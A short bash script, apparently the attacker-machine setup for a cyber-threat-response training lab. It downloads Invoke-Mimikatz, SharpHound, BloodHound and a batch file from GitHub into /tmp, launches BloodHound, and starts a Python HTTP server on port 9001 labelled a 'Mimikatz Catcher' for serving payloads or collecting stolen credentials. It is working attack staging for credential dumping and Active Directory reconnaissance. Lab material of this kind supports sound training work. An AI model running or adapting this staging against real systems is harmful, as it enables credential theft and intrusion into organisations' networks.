#!/bin/bash

#
# Downloading Special Content
#
wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1
wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/safe.bat -O /tmp/safe.bat
wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/SharpHound.ps1 -O /tmp/SharpHound.ps1
wget https://github.com/mosesrenegade/cyber-threat-response-clinic/raw/master/servers/attacker-desktop/BloodHound-linux-x64.zip -O /tmp/BloodHound-linux-x64.zip

#
# Going into /tmp
#
cd /tmp

#
# unzipping BloodHound
#

unzip BloodHound-linux-x64.zip

#
# Running Bloodhound
#
cd BloodHound-linux-x64
./BloodHound &

#
# Executing our Mimikatz Catcher
#
cd /tmp
python -m 'SimpleHTTPServer' 9001

